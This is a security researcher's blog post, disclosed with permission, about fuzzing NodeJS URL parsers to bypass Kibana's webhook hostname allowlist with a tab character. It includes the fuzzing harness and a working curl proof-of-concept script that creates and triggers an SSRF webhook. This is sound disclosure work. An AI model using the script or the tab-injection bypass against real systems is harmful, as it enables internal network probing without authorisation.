# SSRF: Bypassing hostname restrictions with fuzzing | $BLOG_TITLE
FUZZING, SECURITY

February 26, 2021

When the same data is parsed twice by different parsers, [some interesting security bugs](https://about.gitlab.com/blog/2020/03/30/how-to-exploit-parser-differentials/) can be introduced. In this post I will show how I used fuzzing to find a parser diffential issue in Kibana’s alerting and actions feature and how I leveraged [radamsa](https://gitlab.com/akihe/radamsa/) to fuzz NodeJS’ URL parsers.

Kibana alerting and actions
---------------------------

Kibana has an [alerting](https://www.elastic.co/what-is/kibana-alerting) feature that allows users to trigger an action when certain conditions are met. There’s a variety of actions that can be chosen like sending an email, opening a ticket in Jira or sending a request to a webhook. To make sure this doesn’t become SSRF as a feature, there’s an [`xpack.actions.allowedHosts` setting](https://www.elastic.co/guide/en/kibana/current/alert-action-settings-kb.html#action-settings) where users can configure a list of hosts that are allowed as webhook targets.

Parser differential
-------------------

Parsing URLs consistently is [notoriously difficult](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) and sometimes the inconsistencies are there [on purpose](https://hackerone.com/reports/704621). Because of this, I was curious to see how the webhook target was validated against the `xpack.actions.allowedHosts` setting and how the URL was parsed before sending the request to the webhook. Is it the same parser? If not, are there any URLs that can appear fine to the hostname validation but target a completely different URL when sending the HTTP request?

After digging into the webhook code, I coud identify that hostname validation happens in [`isHostnameAllowedInUri`](https://github.com/elastic/kibana/blob/0a7462dc4acb79bc28873b4ce82a510aa624397c/x-pack/plugins/actions/server/actions_config.ts#L68-L69). The important part to notice is that the hostname is extracted from the webhook’s URL by doing `new URL(userInputUrl).hostname`.

```
function isHostnameAllowedInUri(config: ActionsConfigType, uri: string): boolean {
  return pipe(
    tryCatch(() => new URL(uri)),
    map((url) => url.hostname),
    mapNullable((hostname) => isAllowed(config, hostname)),
    getOrElse<boolean>(() => false)
  );
} 
```

On the other hand, the library that sends the HTTP request uses `require('url').parse(userInputUrl).hostname` to [parse the hostname](https://github.com/axios/axios/blob/59ab559386273a185be18857a12ab0305b753e50/lib/adapters/http.js#L91).

```
var url = require('url');

// ...

// Parse url
var fullPath = buildFullPath(config.baseURL, config.url);
var parsed = url.parse(fullPath);

// ...

options.hostname = parsed.hostname; 
```

After reading some documentation, I could validate that those were effectively two different parsers and not just two ways of doing the same thing. Very interesting! Now I’m looking for a URL that is accepted by `isHostnameAllowedInUri` but results in an HTTP request to a different host. In other words, I’m looking for X where `new URL(X).hostname !== require('url').parse(X).hostname` and this is where the fuzzing comes in.

Fuzzing for SSRF
----------------

When you’re looking to generate test strings without going all in with coverage guided fuzzing like AFL or libFuzzer, [radamsa](https://gitlab.com/akihe/radamsa/) is the perfect solution.

> Radamsa is a test case generator for robustness testing, a.k.a. a fuzzer. It is typically used to test how well a program can withstand malformed and potentially malicious inputs. It works by reading sample files of valid data and generating interestringly different outputs from them.

The plan was the following:

1.  Feed a normal URL to radamsa as a starting point
2.  Parse radamsa’s output using both parsers
3.  If both parsed hostnames are different and valid, save that URL

Here’s the code used to do the fuzzing and validate the results:

```
const child_process = require('child_process');
const radamsa = child_process.spawn('./radamsa/bin/radamsa', ['-n', 'inf']);
radamsa.stdin.setEncoding('utf8');
radamsa.stdin.write("user:pass@domain.com:23/?ab=12#")
radamsa.stdin.end()

radamsa.stdout.on('data', function (input) {
    input = 'http://' + input

    // Resulting host names need to be valid for this to be useful
    function isInvalid(host) {
        return host === null || host === '' || !/^[a-zA-Z0-9.-]+$/.test(host1);
    }

    let host1;
    try {
        host1 = new URL(input).hostname;
    } catch (e) {
        return; // Both hosts need to parse
    }

    if (isInvalid(host1)) return;
    if (/^([0-9.]+)$/.test(host1)) return; // host1 should be a domain, not an IP

    let host2;
    try {
        host2 = require('url').parse(input).hostname;
    } catch (e) {
        return; // Both hosts need to parse
    }

    if (isInvalid(host2)) return;
    if (host1 === host2) return;

    console.log(
        `${encodeURIComponent(input)} was parsed as ${host1} with URL constructor and ${host2} with url.parse.`
    );
}); 
```

There are some issues with that code and I think the stdin writer might have trouble handling null bytes, but nevertheless after a little while this popped up (the output was URL-encoded to catch non-printable characters):

```
http%3A%2F%2Fuser%3Apass%40domain.com%094294967298%2F%3Fab%3D- was parsed as domain.com4294967298 with URL constructor and domain.com with url.parse. 
```

With the original string containing the hostname `domain.com<TAB>4294967298`, one parser stripped the tab character and the other truncated the hostname where the tab was inserted. This is very interesting and can definitely be abused: imagine a webhook that requires the target to be `yourdomain.com`, but when you enter `yourdomain.co<TAB>m` the filter thinks it’s valid but the request is actually sent to `yourdomain.co`. All the attacker has to do is register that domain and point it to `127.0.0.1` or any other internal target and it makes for a fun SSRF.

The attack
----------

This is exactly what could be achived in Kibana.

1.  Assume the `xpack.actions.allowedHosts` setting requires webhooks to target `yourdomain.com`
2.  As the attacker, register `yourdomain.co`
3.  Add a DNS record pointing to `127.0.0.1` or any other internal IP
4.  Create a webhook action
5.  Use the API to send a test message to the webhook and specify the url `yourdomain.co<TAB>m`
6.  Observe the response, in this case there were 3 different responses allowing to differentiate a live host, a live host that responds to HTTP requests and a dead host

Here’s the script used to demonstrate the attack.

```
kibana_url="https://localhost:5601/"
creds="elastic:changeme"

# The \t is important
ssrf_target="http://yourdomain.co\tm"

# Create Webhook Action
connector_id=$(curl -sk -u "$creds" --url "$kibana_url/api/actions/action" -X POST -H 'Content-Type: application/json' -H 'kbn-xsrf: true' \
    -d '{"actionTypeId":".webhook","config":{"method":"post","hasAuth":false,"url":"'$ssrf_target'","headers":{"content-type":"application/json"}},"secrets":{"user":null,"password":null},"name":"'$(date +%s)'"}' |
    jq -r .id)

# Send request to target using the test function
curl -sk -u "$creds" --url "$kibana_url/api/actions/action/$connector_id/_execute" -X POST -H 'Content-Type: application/json' -H 'kbn-xsrf: true' \
    -d '{"params":{"body":"{\"arbitrary_payload_here\":true}"}}'

# Server should have received the request 
```

Impact
------

Unfortunately, the resulting URL with the bypass is a bit mangled as we can see from this output taken from the NodeJS console:

```
> require('url').parse("htts://example.co\x09m/path")
Url {
  protocol: 'htts:',
  slashes: true,
  auth: null,
  host: 'example.co',
  port: null,
  hostname: 'example.co',
  hash: null,
  search: null,
  query: null,
  pathname: '%09m/path',
  path: '%09m/path',
  href: 'htts://example.co/%09m/path' } 
```

The part that is truncated from the hostname is just pushed to the path and make it hard to craft any request that can achieve more than the basic internal network/port scan. However, if the parsers’ roles had been inverted and `new URI` had been used for the request instead I would have had a clean path and much more potential for exploitation with a fully controlled path and `POST` body. Certainly this situation comes up _somewhere_, let me know if you come across something like that and are able to exploit it!

Conclusion
----------

A few things to take away from this:

*   When reviewing code, any time data is parsed for valiation make sure it’s parsed the same way when it’s being used
*   Fuzzing with radamsa is simple and quick to setup, a great addition to any bug hunter’s toolbet
*   If you’re doing blackbox testing and facing hostname validations in a NodeJS envioronment, try to add some tabs and see where that leads

Thanks for reading!

(This was disclosed with permission)